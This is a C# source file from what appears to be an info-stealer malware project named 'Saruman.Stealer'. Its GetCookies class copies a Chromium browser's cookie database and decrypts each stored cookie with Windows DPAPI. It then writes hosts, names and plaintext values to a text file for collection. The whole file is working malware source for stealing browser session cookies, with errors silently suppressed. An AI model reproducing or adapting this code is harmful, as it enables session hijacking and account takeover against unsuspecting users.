using Saruman.sqlite;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Saruman.Stealer.Cookies
{
  public  class GetCookies
    {
        public static int CCookies;
        public static string CreateTempPath()
        {
            return (Path.Combine(Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local\\Temp", "tempDataBase" + DateTime.Now.ToString("O").Replace(':', '_') + Thread.CurrentThread.GetHashCode() + Thread.CurrentThread.ManagedThreadId)));
        }
        public static string CreateTempCopy(string filePath)
        {
            string text = CreateTempPath();
            File.Copy(filePath, text, overwrite: true);
            return text;
        }
        static List<string> Cookies = new List<string>();
       public static List<string> domains = new List<string>();
        public static List<string> Cookies_Gecko = new List<string>();

        public static void Cookie_Grab(string profilePath, string browser_name, string profile)
        {
           
            try
            {
                string text = Path.Combine(profilePath, "Cookies");
              
                CNT cNT = new CNT(CreateTempCopy(text));
                cNT.ReadTable("cookies");
                for (int i = 0; i < cNT.RowLength; i++)
                {
                    CCookies++;
                    try
                    {

                        Cookies.Add(cNT.ParseValue(i, "host_key").Trim() + "\t" + (cNT.ParseValue(i, "httponly") == "1") + "\t" + cNT.ParseValue(i, "path").Trim() + "\t" + (cNT.ParseValue(i, "secure") == "1") + "\t" + cNT.ParseValue(i, "expires_utc").Trim() + "\t" + cNT.ParseValue(i, "name").Trim() + "\t" + DecryptBlob(cNT.ParseValue(i, "encrypted_value"), DataProtectionScope.CurrentUser).Trim() + Environment.NewLine);
                        domains.Add(cNT.ParseValue(i, "host_key").Trim());


                    }
                    catch (Exception)
                    {
                    }
                 
                }
                using (StreamWriter streamWriter = new StreamWriter(Program.dir + "\\Browsers\\" + profile + "_" + browser_name + "_Cookies.txt"))
                {
                    for (int a =0; a < Cookies.Count(); a++)
                {
                  
                        streamWriter.Write(Cookies[a]);
                    }
                    }
                Cookies.Clear();
             
            }
            catch
            {
               
            }
        }
     
        public static string DecryptBlob(string EncryptedData, DataProtectionScope dataProtectionScope, byte[] entropy = null)
        {
            return DecryptBlob(Encoding.Default.GetBytes(EncryptedData), dataProtectionScope, entropy);
        }

        public static string DecryptBlob(byte[] EncryptedData, DataProtectionScope dataProtectionScope, byte[] entropy = null)
        {
            try
            {
                if (EncryptedData == null || EncryptedData.Length == 0)
                {
                    return string.Empty;
                }
                byte[] bytes = ProtectedData.Unprotect(EncryptedData, entropy, dataProtectionScope);
                return Encoding.UTF8.GetString(bytes);
            }
            catch (CryptographicException)
            {
                return string.Empty;
            }
            catch (Exception)
            {
                return string.Empty;
            }
        }

    }
}
